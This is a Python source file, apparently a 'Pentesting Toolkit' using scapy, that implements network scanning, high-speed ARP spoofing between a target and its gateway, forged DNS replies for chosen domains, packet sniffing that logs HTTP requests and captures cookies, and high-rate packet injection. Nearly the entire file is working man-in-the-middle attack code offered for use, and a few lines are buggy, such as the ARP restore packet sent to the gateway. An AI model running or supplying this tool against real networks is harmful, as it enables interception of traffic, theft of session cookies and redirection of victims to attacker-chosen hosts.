# !/usr/bin/env python3
import argparse
import logging
import os
import re
import sys
import requests
from concurrent.futures import ThreadPoolExecutor
from threading import Event
from time import sleep
import scapy.all as scapy
from scapy.all import sendpfast, conf, srp, sniff
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers import http, dns

conf.verb = 0
conf.sniff_promisc = 0
conf.neighbor = {}


class NetworkTool:
    def __init__(self, interface=None):
        self.interface = interface or conf.iface
        self.targets = []
        self.spoofing = Event()
        self.dns_spoofing = Event()
        self.dns_mapping = {}
        self.executor = ThreadPoolExecutor(max_workers=5)
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            format='%(asctime)s - %(levelname)s - %(message)s',
            level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)]
        )

    def scan(self, ip_range):
        """Enhanced network scanner with OS detection"""
        logging.info(f"Scanning network {ip_range}...")
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packets = ether / arp
        ans, _ = srp(packets, timeout=0.5, iface=self.interface, retry=0, multi=True, threaded=True)
        self.targets = []
        for _, pkt in ans:
            target = {
                'ip': pkt.psrc,
                'mac': pkt.hwsrc,
                'vendor': self.get_vendor(pkt.hwsrc),
                'os': self.detect_os(pkt.hwsrc)
            }
            self.targets.append(target)
            logging.info(f"Found {target['ip']} ({target['mac']}) - {target['vendor']}")

        return self.targets

    def get_vendor(self, mac):
        """Get vendor from MAC address"""
        try:
            response = requests.get(f"https://api.macvendors.com/{mac}")
            vendor = response.text if response.status_code == 200 else "Unknown"
            if vendor == "unknown":
                try:
                    from scapy.vendor import get_manuf
                    vendor = get_manuf(mac[:8]) or "Unknown"
                except ImportError:
                    vendor = "Unknown"
            return vendor
        except Exception as e:
            logging.error(f"Error fetching vendor information for MAC {mac}: {e}")
            return "Unknown"

    def detect_os(self, mac):
        """Simple OS detection based on MAC vendor"""
        vendor = self.get_vendor(mac).lower()
        if 'apple' in vendor: return 'macOS/iOS'
        if 'microsoft' in vendor: return 'Windows'
        if 'google' in vendor: return 'Chrome OS/Android'
        return 'Unknown'

    def arp_spoof(self, target_ip, gateway_ip):
        """ARP spoofing with automatic restoration"""
        self.gateway_ip = gateway_ip
        self.gateway_mac = self.get_mac(gateway_ip)
        target_mac = self.get_mac(target_ip)
        if not self.gateway_mac or not target_mac:
            logging.info("Failed to resolve MAC addresses. Check network connectivity.")
            return
        self.spoofing.set()

        def spoof_task():
            target_pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
            gateway_pkt = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=gateway_ip,
                                                            psrc=target_ip, hwdst=self.gateway_mac)
            while self.spoofing.is_set():
                try:
                    sendpfast([target_pkt, gateway_pkt] * 10, mbps=100, iface=self.interface)
                except Exception as e:
                    logging.error(f"Packet sending error: {e}")
            logging.debug("ARP spoofing stooped")

        self.executor.submit(spoof_task)
        logging.info(f"High-speed ARP spoofing started between {target_ip} and {gateway_ip}")

    def restore_arp(self, target_ip, gateway_ip):
        """Restore ARP tables"""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            logging.info("Failed to resolve MAC address for RP restoration.")
            return

        restore_pkts = [
            Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac),
            Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=gateway_ip, hwsrc=target_mac)
        ]

        try:
            sendpfast(restore_pkts * 5, mbps=100, iface=self.interface)
            logging.info("ARP table record")
        except Exception as e:
            logging.error(f"Failed to restore ARP tables: {e}")

    def get_mac(self, ip):
        """Get MAC address for a given IP"""
        logging.info(f"Resolving MAC address for IP: {ip}")
        try:
            # Send ARP request and wait for response
            ans, _ = scapy.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False, retry=2)
            if ans:
                mac = ans[0][1].hwsrc
                logging.info(f"Resolved MAC address for {ip}: {mac}")
                return mac
            else:
                logging.error(f"No response received for ARP request to {ip}")
        except Exception as e:
            logging.error(f"Error resolving MAC address for {ip}: {e}")
        return None

    def sniff_packets(self, count=0):
        logging.info(f"Starting packet capture on interface {self.interface} . . .")
        sniff(
            iface=self.interface,
            store=False,
            prn=self.process_packet,
            count=count,
            filter="tcp or udp or icmp",
            stop_filter=lambda _: not (self.spoofing.is_set() or self.dns_spoofing.is_set())
        )

    def process_packet(self, packet):
        """Process captured packets"""
        logging.info(f"Captured packet: {packet.summary()}")
        if packet.haslayer(http.HTTPRequest):
            self.log_http(packet)
            self.extract_cookies(packet)

        if packet.haslayer(dns.DNSQR):
            self.handle_dns(packet)

    def log_http(self, packet):
        """Log HTTP requests"""
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        logging.info(f"HTTP Request: {host}{path}")

    def extract_cookies(self, packet):
        """Extract cookies from HTTP traffic"""
        if packet.haslayer(http.HTTPRequest):
            cookies = packet[http.HTTPRequest].Cookie
            if cookies:
                logging.info(f"Cookies captured: {cookies.decode()}")
        elif packet.haslayer(http.HTTPResponse):
            cookies = packet[http.HTTPResponse].Set_Cookie
            if cookies:
                logging.info(f"Set-Cookie captured: {cookies.decode()}")

    def handle_dns(self, packet):
        """DNS spoofer handler"""
        if self.dns_spoofing.is_set() and packet[dns.DNS].qr == 0:
            qname = packet[dns.DNSQR].qname.decode()
            for pattern, ip in self.dns_mapping.items():
                spoof_pkt = (
                        Ether(src=packet[Ether].dst, dst=packet[Ether].src) /
                        IP(src=packet[IP].dst, dst=packet[IP].src) /
                        UDP(sport=53, dport=packet[UDP].sport) /
                        dns.DNS(id=packet[dns.DNS].id, qr=1, aa=1, qd=packet[dns.DNS].qd,
                                an=dns.DNSRR(rrname=qname, ttl=300, rdata=ip))
                )
                sendpfast(spoof_pkt, iface=self.interface, mbps=50)
                logging.info(f"Spoofed DNS: {qname} -> {ip}")
                break

    def add_dns_spoof(self, domain, fake_ip):
        """Add DNS spoofing rule"""
        self.dns_mapping[re.compile(domain, re.IGNORECASE)] = fake_ip
        self.dns_spoofing.set()
        logging.info(f"DNS spoofing added: {domain} -> {fake_ip}")

    def inject_packet(self, target_ip, protocol='tcp', payload='', count=100):
        """💣 Packet injection"""
        pkt = IP(dst=target_ip)
        if protocol.lower() == 'tcp':
            pkt /= TCP() / payload
        elif protocol.lower() == 'udp':
            pkt /= UDP() / payload
        elif protocol.lower() == 'icmp':
            pkt /= ICMP() / payload

        sendpfast(pkt * count, mbps=1000, iface=self.interface)
        logging.info(f"Injected {protocol.upper()} packet to {target_ip}")


def main():
    parser = argparse.ArgumentParser(description="Pentesting Toolkit")
    parser.add_argument('-s', '--scan', metavar='IP_RANGE', help='Network scan')
    parser.add_argument('-a', '--arp-spoof', nargs=2, metavar=('TARGET', 'GATEWAY'), help='ARP spoofing')
    parser.add_argument('-d', '--dns-spoof', nargs=2, action='append',
                        metavar=('DOMAIN', 'IP'), help='DNS spoofing')
    parser.add_argument('-i', '--interface', help='Network interface')
    parser.add_argument('-p', '--packet-sniff', type=int, metavar='COUNT', help='Packet sniffing')
    args = parser.parse_args()

    if not any(vars(args).values()):
        parser.print_help()
        sys.exit(1)

    tool = NetworkTool(args.interface)

    try:
        if args.scan:
            tool.scan(args.scan)

        if args.arp_spoof:
            tool.arp_spoof(*args.arp_spoof)

        if args.dns_spoof:
            for domain, ip in args.dns_spoof:
                tool.add_dns_spoof(domain, ip)

        if args.packet_sniff is not None:
            tool.sniff_packets(count=args.packet_sniff)

        while True: sleep(1)

    except KeyboardInterrupt:
        logging.info("Shutting down...")
        if args.arp_spoof:
            tool.restore_arp(*args.arp_spoof)
        logging.info("Tool shutdown")
        sys.exit(0)

    except Exception as e:
        logging.error(f"An error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    if not sys.platform.startswith('linux'):
        print("This tool requires Linux")
        sys.exit(1)
    if os.geteuid() != 0:
        print("Requires root privileges")
        sys.exit(1)
    main()